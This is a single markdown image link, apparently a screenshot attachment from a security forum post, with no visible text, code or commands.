![image-20210711221501211](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8b5e51cbfc4c4bcfc2b00c6b4b042f3d91afd00f.png)